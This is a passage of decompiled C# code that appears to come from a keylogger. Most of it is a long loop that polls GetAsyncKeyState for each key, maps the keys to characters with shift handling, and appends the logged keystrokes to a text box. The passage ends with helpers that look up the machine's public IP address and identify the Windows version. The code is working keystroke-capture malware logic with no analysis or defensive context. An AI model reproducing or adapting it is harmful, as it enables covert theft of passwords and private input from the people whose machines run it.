						}
						goto IL_017e;
						IL_0154:
						*unchecked((int*)((byte*)ptr + 8)) = 20;
						object_2 = "[Backspace]";
						goto IL_0165;
						IL_0165:
						*unchecked((int*)((byte*)ptr + 8)) = 21;
						int_0 += 4;
						goto IL_13a1;
						IL_017e:
						*unchecked((int*)((byte*)ptr + 8)) = 24;
						object_1 = GetAsyncKeyState(32);
						goto IL_0196;
						IL_0196:
						*unchecked((int*)((byte*)ptr + 8)) = 25;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_01b4;
						}
						goto IL_01ca;
						IL_01b4:
						*unchecked((int*)((byte*)ptr + 8)) = 26;
						object_2 = " ";
						goto IL_13a1;
						IL_01ca:
						*unchecked((int*)((byte*)ptr + 8)) = 30;
						object_1 = GetAsyncKeyState(186);
						goto IL_01e5;
						IL_01e5:
						*unchecked((int*)((byte*)ptr + 8)) = 31;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0203;
						}
						goto IL_0243;
						IL_0203:
						*unchecked((int*)((byte*)ptr + 8)) = 32;
						if (!method_2())
						{
							goto IL_0211;
						}
						goto IL_0227;
						IL_0211:
						*unchecked((int*)((byte*)ptr + 8)) = 33;
						object_2 = ";";
						goto IL_13a1;
						IL_0227:
						*unchecked((int*)((byte*)ptr + 8)) = 35;
						goto IL_022d;
						IL_022d:
						*unchecked((int*)((byte*)ptr + 8)) = 36;
						object_2 = ":";
						goto IL_13a1;
						IL_0243:
						*unchecked((int*)((byte*)ptr + 8)) = 41;
						object_1 = GetAsyncKeyState(187);
						goto IL_025e;
						IL_025e:
						*unchecked((int*)((byte*)ptr + 8)) = 42;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_027c;
						}
						goto IL_02bc;
						IL_027c:
						*unchecked((int*)((byte*)ptr + 8)) = 43;
						if (!method_2())
						{
							goto IL_028a;
						}
						goto IL_02a0;
						IL_028a:
						*unchecked((int*)((byte*)ptr + 8)) = 44;
						object_2 = "=";
						goto IL_13a1;
						IL_02a0:
						*unchecked((int*)((byte*)ptr + 8)) = 46;
						goto IL_02a6;
						IL_02a6:
						*unchecked((int*)((byte*)ptr + 8)) = 47;
						object_2 = "+";
						goto IL_13a1;
						IL_02bc:
						*unchecked((int*)((byte*)ptr + 8)) = 52;
						object_1 = GetAsyncKeyState(188);
						goto IL_02d7;
						IL_02d7:
						*unchecked((int*)((byte*)ptr + 8)) = 53;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_02f5;
						}
						goto IL_0335;
						IL_02f5:
						*unchecked((int*)((byte*)ptr + 8)) = 54;
						if (!method_2())
						{
							goto IL_0303;
						}
						goto IL_0319;
						IL_0303:
						*unchecked((int*)((byte*)ptr + 8)) = 55;
						object_2 = ",";
						goto IL_13a1;
						IL_0319:
						*unchecked((int*)((byte*)ptr + 8)) = 57;
						goto IL_031f;
						IL_031f:
						*unchecked((int*)((byte*)ptr + 8)) = 58;
						object_2 = "<";
						goto IL_13a1;
						IL_0335:
						*unchecked((int*)((byte*)ptr + 8)) = 63;
						object_1 = GetAsyncKeyState(189);
						goto IL_0350;
						IL_0350:
						*unchecked((int*)((byte*)ptr + 8)) = 64;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_036e;
						}
						goto IL_03ae;
						IL_036e:
						*unchecked((int*)((byte*)ptr + 8)) = 65;
						if (!method_2())
						{
							goto IL_037c;
						}
						goto IL_0392;
						IL_037c:
						*unchecked((int*)((byte*)ptr + 8)) = 66;
						object_2 = "-";
						goto IL_13a1;
						IL_0392:
						*unchecked((int*)((byte*)ptr + 8)) = 68;
						goto IL_0398;
						IL_0398:
						*unchecked((int*)((byte*)ptr + 8)) = 69;
						object_2 = "_";
						goto IL_13a1;
						IL_03ae:
						*unchecked((int*)((byte*)ptr + 8)) = 74;
						object_1 = GetAsyncKeyState(190);
						goto IL_03c9;
						IL_03c9:
						*unchecked((int*)((byte*)ptr + 8)) = 75;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_03e7;
						}
						goto IL_0427;
						IL_03e7:
						*unchecked((int*)((byte*)ptr + 8)) = 76;
						if (!method_2())
						{
							goto IL_03f5;
						}
						goto IL_040b;
						IL_03f5:
						*unchecked((int*)((byte*)ptr + 8)) = 77;
						object_2 = ".";
						goto IL_13a1;
						IL_040b:
						*unchecked((int*)((byte*)ptr + 8)) = 79;
						goto IL_0411;
						IL_0411:
						*unchecked((int*)((byte*)ptr + 8)) = 80;
						object_2 = ">";
						goto IL_13a1;
						IL_0427:
						*unchecked((int*)((byte*)ptr + 8)) = 85;
						object_1 = GetAsyncKeyState(191);
						goto IL_0442;
						IL_0442:
						*unchecked((int*)((byte*)ptr + 8)) = 86;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0460;
						}
						goto IL_04a0;
						IL_0460:
						*unchecked((int*)((byte*)ptr + 8)) = 87;
						if (!method_2())
						{
							goto IL_046e;
						}
						goto IL_0484;
						IL_046e:
						*unchecked((int*)((byte*)ptr + 8)) = 88;
						object_2 = "/";
						goto IL_13a1;
						IL_0484:
						*unchecked((int*)((byte*)ptr + 8)) = 90;
						goto IL_048a;
						IL_048a:
						*unchecked((int*)((byte*)ptr + 8)) = 91;
						object_2 = "?";
						goto IL_13a1;
						IL_04a0:
						*unchecked((int*)((byte*)ptr + 8)) = 96;
						object_1 = GetAsyncKeyState(192);
						goto IL_04bb;
						IL_04bb:
						*unchecked((int*)((byte*)ptr + 8)) = 97;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_04d9;
						}
						goto IL_0519;
						IL_04d9:
						*unchecked((int*)((byte*)ptr + 8)) = 98;
						if (!method_2())
						{
							goto IL_04e7;
						}
						goto IL_04fd;
						IL_04e7:
						*unchecked((int*)((byte*)ptr + 8)) = 99;
						object_2 = "`";
						goto IL_13a1;
						IL_04fd:
						*unchecked((int*)((byte*)ptr + 8)) = 101;
						goto IL_0503;
						IL_0503:
						*unchecked((int*)((byte*)ptr + 8)) = 102;
						object_2 = "~";
						goto IL_13a1;
						IL_0519:
						*unchecked((int*)((byte*)ptr + 8)) = 107;
						object_1 = GetAsyncKeyState(96);
						goto IL_0531;
						IL_0531:
						*unchecked((int*)((byte*)ptr + 8)) = 108;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_054f;
						}
						goto IL_058f;
						IL_054f:
						*unchecked((int*)((byte*)ptr + 8)) = 109;
						if (!method_2())
						{
							goto IL_055d;
						}
						goto IL_0573;
						IL_055d:
						*unchecked((int*)((byte*)ptr + 8)) = 110;
						object_2 = "0";
						goto IL_13a1;
						IL_0573:
						*unchecked((int*)((byte*)ptr + 8)) = 112;
						goto IL_0579;
						IL_0579:
						*unchecked((int*)((byte*)ptr + 8)) = 113;
						object_2 = ")";
						goto IL_13a1;
						IL_058f:
						*unchecked((int*)((byte*)ptr + 8)) = 118;
						object_1 = GetAsyncKeyState(97);
						goto IL_05a7;
						IL_05a7:
						*unchecked((int*)((byte*)ptr + 8)) = 119;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_05c5;
						}
						goto IL_0605;
						IL_05c5:
						*unchecked((int*)((byte*)ptr + 8)) = 120;
						if (!method_2())
						{
							goto IL_05d3;
						}
						goto IL_05e9;
						IL_05d3:
						*unchecked((int*)((byte*)ptr + 8)) = 121;
						object_2 = "1";
						goto IL_13a1;
						IL_05e9:
						*unchecked((int*)((byte*)ptr + 8)) = 123;
						goto IL_05ef;
						IL_05ef:
						*unchecked((int*)((byte*)ptr + 8)) = 124;
						object_2 = "!";
						goto IL_13a1;
						IL_0605:
						*unchecked((int*)((byte*)ptr + 8)) = 129;
						object_1 = GetAsyncKeyState(98);
						goto IL_0620;
						IL_0620:
						*unchecked((int*)((byte*)ptr + 8)) = 130;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0641;
						}
						goto IL_068d;
						IL_0641:
						*unchecked((int*)((byte*)ptr + 8)) = 131;
						if (!method_2())
						{
							goto IL_0652;
						}
						goto IL_066b;
						IL_0652:
						*unchecked((int*)((byte*)ptr + 8)) = 132;
						object_2 = "2";
						goto IL_13a1;
						IL_066b:
						*unchecked((int*)((byte*)ptr + 8)) = 134;
						goto IL_0674;
						IL_0674:
						*unchecked((int*)((byte*)ptr + 8)) = 135;
						object_2 = "@";
						goto IL_13a1;
						IL_068d:
						*unchecked((int*)((byte*)ptr + 8)) = 140;
						object_1 = GetAsyncKeyState(99);
						goto IL_06a8;
						IL_06a8:
						*unchecked((int*)((byte*)ptr + 8)) = 141;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_06c9;
						}
						goto IL_0715;
						IL_06c9:
						*unchecked((int*)((byte*)ptr + 8)) = 142;
						if (!method_2())
						{
							goto IL_06da;
						}
						goto IL_06f3;
						IL_06da:
						*unchecked((int*)((byte*)ptr + 8)) = 143;
						object_2 = "3";
						goto IL_13a1;
						IL_06f3:
						*unchecked((int*)((byte*)ptr + 8)) = 145;
						goto IL_06fc;
						IL_06fc:
						*unchecked((int*)((byte*)ptr + 8)) = 146;
						object_2 = "#";
						goto IL_13a1;
						IL_0715:
						*unchecked((int*)((byte*)ptr + 8)) = 151;
						object_1 = GetAsyncKeyState(100);
						goto IL_0730;
						IL_0730:
						*unchecked((int*)((byte*)ptr + 8)) = 152;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0751;
						}
						goto IL_079d;
						IL_0751:
						*unchecked((int*)((byte*)ptr + 8)) = 153;
						if (!method_2())
						{
							goto IL_0762;
						}
						goto IL_077b;
						IL_0762:
						*unchecked((int*)((byte*)ptr + 8)) = 154;
						object_2 = "4";
						goto IL_13a1;
						IL_077b:
						*unchecked((int*)((byte*)ptr + 8)) = 156;
						goto IL_0784;
						IL_0784:
						*unchecked((int*)((byte*)ptr + 8)) = 157;
						object_2 = "$";
						goto IL_13a1;
						IL_079d:
						*unchecked((int*)((byte*)ptr + 8)) = 162;
						object_1 = GetAsyncKeyState(101);
						goto IL_07b8;
						IL_07b8:
						*unchecked((int*)((byte*)ptr + 8)) = 163;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_07d9;
						}
						goto IL_0825;
						IL_07d9:
						*unchecked((int*)((byte*)ptr + 8)) = 164;
						if (!method_2())
						{
							goto IL_07ea;
						}
						goto IL_0803;
						IL_07ea:
						*unchecked((int*)((byte*)ptr + 8)) = 165;
						object_2 = "5";
						goto IL_13a1;
						IL_0803:
						*unchecked((int*)((byte*)ptr + 8)) = 167;
						goto IL_080c;
						IL_080c:
						*unchecked((int*)((byte*)ptr + 8)) = 168;
						object_2 = "%";
						goto IL_13a1;
						IL_0825:
						*unchecked((int*)((byte*)ptr + 8)) = 173;
						object_1 = GetAsyncKeyState(102);
						goto IL_0840;
						IL_0840:
						*unchecked((int*)((byte*)ptr + 8)) = 174;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0861;
						}
						goto IL_08ad;
						IL_0861:
						*unchecked((int*)((byte*)ptr + 8)) = 175;
						if (!method_2())
						{
							goto IL_0872;
						}
						goto IL_088b;
						IL_0872:
						*unchecked((int*)((byte*)ptr + 8)) = 176;
						object_2 = "6";
						goto IL_13a1;
						IL_088b:
						*unchecked((int*)((byte*)ptr + 8)) = 178;
						goto IL_0894;
						IL_0894:
						*unchecked((int*)((byte*)ptr + 8)) = 179;
						object_2 = "7";
						goto IL_13a1;
						IL_08ad:
						*unchecked((int*)((byte*)ptr + 8)) = 184;
						object_1 = GetAsyncKeyState(103);
						goto IL_08c8;
						IL_08c8:
						*unchecked((int*)((byte*)ptr + 8)) = 185;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_08e9;
						}
						goto IL_0935;
						IL_08e9:
						*unchecked((int*)((byte*)ptr + 8)) = 186;
						if (!method_2())
						{
							goto IL_08fa;
						}
						goto IL_0913;
						IL_08fa:
						*unchecked((int*)((byte*)ptr + 8)) = 187;
						object_2 = "7";
						goto IL_13a1;
						IL_0913:
						*unchecked((int*)((byte*)ptr + 8)) = 189;
						goto IL_091c;
						IL_091c:
						*unchecked((int*)((byte*)ptr + 8)) = 190;
						object_2 = "&";
						goto IL_13a1;
						IL_0935:
						*unchecked((int*)((byte*)ptr + 8)) = 195;
						object_1 = GetAsyncKeyState(104);
						goto IL_0950;
						IL_0950:
						*unchecked((int*)((byte*)ptr + 8)) = 196;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0971;
						}
						goto IL_09bd;
						IL_0971:
						*unchecked((int*)((byte*)ptr + 8)) = 197;
						if (!method_2())
						{
							goto IL_0982;
						}
						goto IL_099b;
						IL_0982:
						*unchecked((int*)((byte*)ptr + 8)) = 198;
						object_2 = "8";
						goto IL_13a1;
						IL_099b:
						*unchecked((int*)((byte*)ptr + 8)) = 200;
						goto IL_09a4;
						IL_09a4:
						*unchecked((int*)((byte*)ptr + 8)) = 201;
						object_2 = "*";
						goto IL_13a1;
						IL_09bd:
						*unchecked((int*)((byte*)ptr + 8)) = 206;
						object_1 = GetAsyncKeyState(105);
						goto IL_09d8;
						IL_09d8:
						*unchecked((int*)((byte*)ptr + 8)) = 207;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_09f9;
						}
						goto IL_0a45;
						IL_09f9:
						*unchecked((int*)((byte*)ptr + 8)) = 208;
						if (!method_2())
						{
							goto IL_0a0a;
						}
						goto IL_0a23;
						IL_0a0a:
						*unchecked((int*)((byte*)ptr + 8)) = 209;
						object_2 = "9";
						goto IL_13a1;
						IL_0a23:
						*unchecked((int*)((byte*)ptr + 8)) = 211;
						goto IL_0a2c;
						IL_0a2c:
						*unchecked((int*)((byte*)ptr + 8)) = 212;
						object_2 = "(";
						goto IL_13a1;
						IL_0a45:
						*unchecked((int*)((byte*)ptr + 8)) = 217;
						object_1 = GetAsyncKeyState(106);
						goto IL_0a60;
						IL_0a60:
						*unchecked((int*)((byte*)ptr + 8)) = 218;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0a81;
						}
						goto IL_0ae4;
						IL_0a81:
						*unchecked((int*)((byte*)ptr + 8)) = 219;
						if (!method_2())
						{
							goto IL_0a92;
						}
						goto IL_0ac2;
						IL_0a92:
						*unchecked((int*)((byte*)ptr + 8)) = 220;
						object_2 = "*";
						goto IL_0aa6;
						IL_0aa6:
						*unchecked((int*)((byte*)ptr + 8)) = 221;
						int_0++;
						goto IL_13a1;
						IL_0ac2:
						*unchecked((int*)((byte*)ptr + 8)) = 223;
						goto IL_0acb;
						IL_0acb:
						*unchecked((int*)((byte*)ptr + 8)) = 224;
						object_2 = "";
						goto IL_13a1;
						IL_0ae4:
						*unchecked((int*)((byte*)ptr + 8)) = 228;
						object_1 = GetAsyncKeyState(107);
						goto IL_0aff;
						IL_0aff:
						*unchecked((int*)((byte*)ptr + 8)) = 229;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0b20;
						}
						goto IL_0b6c;
						IL_0b20:
						*unchecked((int*)((byte*)ptr + 8)) = 230;
						if (!method_2())
						{
							goto IL_0b31;
						}
						goto IL_0b4a;
						IL_0b31:
						*unchecked((int*)((byte*)ptr + 8)) = 231;
						object_2 = "+";
						goto IL_13a1;
						IL_0b4a:
						*unchecked((int*)((byte*)ptr + 8)) = 233;
						goto IL_0b53;
						IL_0b53:
						*unchecked((int*)((byte*)ptr + 8)) = 234;
						object_2 = "=";
						goto IL_13a1;
						IL_0b6c:
						*unchecked((int*)((byte*)ptr + 8)) = 239;
						object_1 = GetAsyncKeyState(108);
						goto IL_0b87;
						IL_0b87:
						*unchecked((int*)((byte*)ptr + 8)) = 240;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0ba8;
						}
						goto IL_0bc1;
						IL_0ba8:
						*unchecked((int*)((byte*)ptr + 8)) = 241;
						object_2 = "";
						goto IL_13a1;
						IL_0bc1:
						*unchecked((int*)((byte*)ptr + 8)) = 244;
						object_1 = GetAsyncKeyState(109);
						goto IL_0bdc;
						IL_0bdc:
						*unchecked((int*)((byte*)ptr + 8)) = 245;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0bfd;
						}
						goto IL_0c49;
						IL_0bfd:
						*unchecked((int*)((byte*)ptr + 8)) = 246;
						if (!method_2())
						{
							goto IL_0c0e;
						}
						goto IL_0c27;
						IL_0c0e:
						*unchecked((int*)((byte*)ptr + 8)) = 247;
						object_2 = "-";
						goto IL_13a1;
						IL_0c27:
						*unchecked((int*)((byte*)ptr + 8)) = 249;
						goto IL_0c30;
						IL_0c30:
						*unchecked((int*)((byte*)ptr + 8)) = 250;
						object_2 = "_";
						goto IL_13a1;
						IL_0c49:
						*unchecked((int*)((byte*)ptr + 8)) = 255;
						object_1 = GetAsyncKeyState(110);
						goto IL_0c64;
						IL_0c64:
						*unchecked((int*)((byte*)ptr + 8)) = 256;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0c85;
						}
						goto IL_0cd1;
						IL_0c85:
						*unchecked((int*)((byte*)ptr + 8)) = 257;
						if (!method_2())
						{
							goto IL_0c96;
						}
						goto IL_0caf;
						IL_0c96:
						*unchecked((int*)((byte*)ptr + 8)) = 258;
						object_2 = ".";
						goto IL_13a1;
						IL_0caf:
						*unchecked((int*)((byte*)ptr + 8)) = 260;
						goto IL_0cb8;
						IL_0cb8:
						*unchecked((int*)((byte*)ptr + 8)) = 261;
						object_2 = ">";
						goto IL_13a1;
						IL_0cd1:
						*unchecked((int*)((byte*)ptr + 8)) = 266;
						object_1 = GetAsyncKeyState(111);
						goto IL_0cec;
						IL_0cec:
						*unchecked((int*)((byte*)ptr + 8)) = 267;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0d0d;
						}
						goto IL_0d26;
						IL_0d0d:
						*unchecked((int*)((byte*)ptr + 8)) = 268;
						object_2 = "/";
						goto IL_13a1;
						IL_0d26:
						*unchecked((int*)((byte*)ptr + 8)) = 272;
						object_1 = GetAsyncKeyState(2);
						goto IL_0d40;
						IL_0d40:
						*unchecked((int*)((byte*)ptr + 8)) = 273;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0d61;
						}
						goto IL_0dad;
						IL_0d61:
						*unchecked((int*)((byte*)ptr + 8)) = 274;
						if (!method_2())
						{
							goto IL_0d72;
						}
						goto IL_0d8b;
						IL_0d72:
						*unchecked((int*)((byte*)ptr + 8)) = 275;
						object_2 = "/";
						goto IL_13a1;
						IL_0d8b:
						*unchecked((int*)((byte*)ptr + 8)) = 277;
						goto IL_0d94;
						IL_0d94:
						*unchecked((int*)((byte*)ptr + 8)) = 278;
						object_2 = "?";
						goto IL_13a1;
						IL_0dad:
						*unchecked((int*)((byte*)ptr + 8)) = 283;
						object_1 = GetAsyncKeyState(220);
						goto IL_0dcb;
						IL_0dcb:
						*unchecked((int*)((byte*)ptr + 8)) = 284;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0dec;
						}
						goto IL_0e38;
						IL_0dec:
						*unchecked((int*)((byte*)ptr + 8)) = 285;
						if (!method_2())
						{
							goto IL_0dfd;
						}
						goto IL_0e16;
						IL_0dfd:
						*unchecked((int*)((byte*)ptr + 8)) = 286;
						object_2 = "\\";
						goto IL_13a1;
						IL_0e16:
						*unchecked((int*)((byte*)ptr + 8)) = 288;
						goto IL_0e1f;
						IL_0e1f:
						*unchecked((int*)((byte*)ptr + 8)) = 289;
						object_2 = "|";
						goto IL_13a1;
						IL_0e38:
						*unchecked((int*)((byte*)ptr + 8)) = 294;
						object_1 = GetAsyncKeyState(222);
						goto IL_0e56;
						IL_0e56:
						*unchecked((int*)((byte*)ptr + 8)) = 295;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0e77;
						}
						goto IL_0ec5;
						IL_0e77:
						*unchecked((int*)((byte*)ptr + 8)) = 296;
						if (!method_2())
						{
							goto IL_0e88;
						}
						goto IL_0ea1;
						IL_0e88:
						*unchecked((int*)((byte*)ptr + 8)) = 297;
						object_2 = "'";
						goto IL_13a1;
						IL_0ea1:
						*unchecked((int*)((byte*)ptr + 8)) = 299;
						goto IL_0eaa;
						IL_0eaa:
						*unchecked((int*)((byte*)ptr + 8)) = 300;
						object_2 = '"';
						goto IL_13a1;
						IL_0ec5:
						*unchecked((int*)((byte*)ptr + 8)) = 305;
						object_1 = GetAsyncKeyState(221);
						goto IL_0ee3;
						IL_0ee3:
						*unchecked((int*)((byte*)ptr + 8)) = 306;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0f04;
						}
						goto IL_0f50;
						IL_0f04:
						*unchecked((int*)((byte*)ptr + 8)) = 307;
						if (!method_2())
						{
							goto IL_0f15;
						}
						goto IL_0f2e;
						IL_0f15:
						*unchecked((int*)((byte*)ptr + 8)) = 308;
						object_2 = "]";
						goto IL_13a1;
						IL_0f2e:
						*unchecked((int*)((byte*)ptr + 8)) = 310;
						goto IL_0f37;
						IL_0f37:
						*unchecked((int*)((byte*)ptr + 8)) = 311;
						object_2 = "}";
						goto IL_13a1;
						IL_0f50:
						*unchecked((int*)((byte*)ptr + 8)) = 316;
						object_1 = GetAsyncKeyState(219);
						goto IL_0f6e;
						IL_0f6e:
						*unchecked((int*)((byte*)ptr + 8)) = 317;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0f8f;
						}
						goto IL_0fdb;
						IL_0f8f:
						*unchecked((int*)((byte*)ptr + 8)) = 318;
						if (!method_2())
						{
							goto IL_0fa0;
						}
						goto IL_0fb9;
						IL_0fa0:
						*unchecked((int*)((byte*)ptr + 8)) = 319;
						object_2 = "[";
						goto IL_13a1;
						IL_0fb9:
						*unchecked((int*)((byte*)ptr + 8)) = 321;
						goto IL_0fc2;
						IL_0fc2:
						*unchecked((int*)((byte*)ptr + 8)) = 322;
						object_2 = "{";
						goto IL_13a1;
						IL_0fdb:
						*unchecked((int*)((byte*)ptr + 8)) = 327;
						if (ForLoopControl.ForLoopInitObj(object_0, (object)48, (object)57, (object)1, ref obj, ref object_0))
						{
							goto IL_1010;
						}
						goto IL_1207;
						IL_1010:
						*unchecked((int*)((byte*)ptr + 8)) = 328;
						object_1 = GetAsyncKeyState(Conversions.ToInteger(object_0));
						goto IL_1034;
						IL_1034:
						*unchecked((int*)((byte*)ptr + 8)) = 329;
						if (!Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_1055;
						}
						goto IL_1077;
						IL_1055:
						*unchecked((int*)((byte*)ptr + 8)) = 371;
						if (ForLoopControl.ForNextCheckObj(object_0, obj, ref object_0))
						{
							goto IL_1010;
						}
						goto IL_1207;
						IL_1077:
						*unchecked((int*)((byte*)ptr + 8)) = 330;
						if (method_2())
						{
							goto IL_108b;
						}
						goto IL_11d5;
						IL_108b:
						*unchecked((int*)((byte*)ptr + 8)) = 331;
						switch (Conversion.Val(Strings.Chr(Conversions.ToInteger(object_0))))
						{
						case 0:
							break;
						case 1:
							goto IL_10f4;
						case 2:
							goto IL_110d;
						case 3:
							goto IL_1126;
						case 4:
							goto IL_113f;
						case 5:
							goto IL_1158;
						case 6:
							goto IL_1171;
						case 7:
							goto IL_118a;
						case 8:
							goto IL_11a3;
						case 9:
							goto IL_11bc;
						default:
							goto IL_13a1;
						}
						goto IL_10db;
						IL_11bc:
						*unchecked((int*)((byte*)ptr + 8)) = 359;
						object_2 = "(";
						goto IL_13a1;
						IL_11a3:
						*unchecked((int*)((byte*)ptr + 8)) = 356;
						object_2 = "*";
						goto IL_13a1;
						IL_118a:
						*unchecked((int*)((byte*)ptr + 8)) = 353;
						object_2 = "&";
						goto IL_13a1;
						IL_1171:
						*unchecked((int*)((byte*)ptr + 8)) = 350;
						object_2 = "^";
						goto IL_13a1;
						IL_1158:
						*unchecked((int*)((byte*)ptr + 8)) = 347;
						object_2 = "%";
						goto IL_13a1;
						IL_113f:
						*unchecked((int*)((byte*)ptr + 8)) = 344;
						object_2 = "$";
						goto IL_13a1;
						IL_1126:
						*unchecked((int*)((byte*)ptr + 8)) = 341;
						object_2 = "#";
						goto IL_13a1;
						IL_110d:
						*unchecked((int*)((byte*)ptr + 8)) = 338;
						object_2 = "@";
						goto IL_13a1;
						IL_10f4:
						*unchecked((int*)((byte*)ptr + 8)) = 335;
						object_2 = "!";
						goto IL_13a1;
						IL_10db:
						*unchecked((int*)((byte*)ptr + 8)) = 362;
						object_2 = ")";
						goto IL_13a1;
						IL_11d5:
						*unchecked((int*)((byte*)ptr + 8)) = 365;
						goto IL_11de;
						IL_11de:
						*unchecked((int*)((byte*)ptr + 8)) = 366;
						object_2 = Strings.Chr(Conversions.ToInteger(object_0));
						goto IL_13a1;
						IL_1207:
						*unchecked((int*)((byte*)ptr + 8)) = 372;
						if (!ForLoopControl.ForLoopInitObj(object_0, (object)65, (object)128, (object)1, ref obj2, ref object_0))
						{
							break;
						}
						goto IL_123f;
						IL_123f:
						*unchecked((int*)((byte*)ptr + 8)) = 373;
						object_1 = GetAsyncKeyState(Conversions.ToInteger(object_0));
						goto IL_1263;
						IL_1263:
						*unchecked((int*)((byte*)ptr + 8)) = 374;
						if (!Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_1284;
						}
						goto IL_12a6;
						IL_1284:
						*unchecked((int*)((byte*)ptr + 8)) = 394;
						if (!ForLoopControl.ForNextCheckObj(object_0, obj2, ref object_0))
						{
							break;
						}
						goto IL_123f;
						IL_12a6:
						*unchecked((int*)((byte*)ptr + 8)) = 375;
						if (!method_2())
						{
							goto IL_12b7;
						}
						goto IL_132a;
						IL_12b7:
						*unchecked((int*)((byte*)ptr + 8)) = 376;
						if (method_1())
						{
							goto IL_12c8;
						}
						goto IL_12f6;
						IL_12c8:
						*unchecked((int*)((byte*)ptr + 8)) = 377;
						object_2 = Strings.UCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_13a1;
						IL_12f6:
						*unchecked((int*)((byte*)ptr + 8)) = 379;
						goto IL_12ff;
						IL_12ff:
						*unchecked((int*)((byte*)ptr + 8)) = 380;
						object_2 = Strings.LCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_13a1;
						IL_132a:
						*unchecked((int*)((byte*)ptr + 8)) = 383;
						goto IL_1333;
						IL_1333:
						*unchecked((int*)((byte*)ptr + 8)) = 384;
						if (!method_1())
						{
							goto IL_1344;
						}
						goto IL_136f;
						IL_1344:
						*unchecked((int*)((byte*)ptr + 8)) = 385;
						object_2 = Strings.UCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_13a1;
						IL_136f:
						*unchecked((int*)((byte*)ptr + 8)) = 387;
						goto IL_1378;
						IL_1378:
						*unchecked((int*)((byte*)ptr + 8)) = 388;
						object_2 = Strings.LCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_13a1;
						IL_13a1:
						*unchecked((int*)((byte*)ptr + 8)) = 397;
						if (int_0 > int_1)
						{
							goto IL_13b8;
						}
						goto IL_13e1;
						IL_13b8:
						*unchecked((int*)((byte*)ptr + 8)) = 398;
						int_0 = 0;
						goto IL_13c8;
						IL_13c8:
						*unchecked((int*)((byte*)ptr + 8)) = 399;
						((TextBoxBase)vmethod_4()).AppendText("\r\n");
						goto IL_13e1;
						IL_13e1:
						*unchecked((int*)((byte*)ptr + 8)) = 401;
						if (Operators.ConditionalCompareObjectNotEqual(object_2, (object)"", false))
						{
							goto IL_13fd;
						}
						goto IL_141c;
						IL_13fd:
						*unchecked((int*)((byte*)ptr + 8)) = 402;
						((TextBoxBase)vmethod_4()).AppendText(Conversions.ToString(object_2));
						goto IL_141c;
						end_IL_0006_2:
						break;
					}
				}
				*(int*)((byte*)ptr + 8) = 395;
				Application.DoEvents();
				break;
				end_IL_0006:;
			}
			catch (object obj3) when ((obj3 is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0006_dispatch = 7610;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private IPAddress method_4()
	{
		using WebClient webClient = new WebClient();
		return IPAddress.Parse(Encoding.ASCII.GetString(webClient.DownloadData("http://automation.whatismyip.com/n09230945.asp")));
	}

	public static string smethod_1()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string result = "UN";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 0:
				result = "95";
				break;
			case 10:
				result = "98";
				break;
			case 90:
				result = "ME";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				result = "NT";
				break;
			case 4:
				result = "NT";
				break;
			case 5:
				if (oSVersion.Version.Minor == 0)
				{
					result = "2K";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "XP";
				}
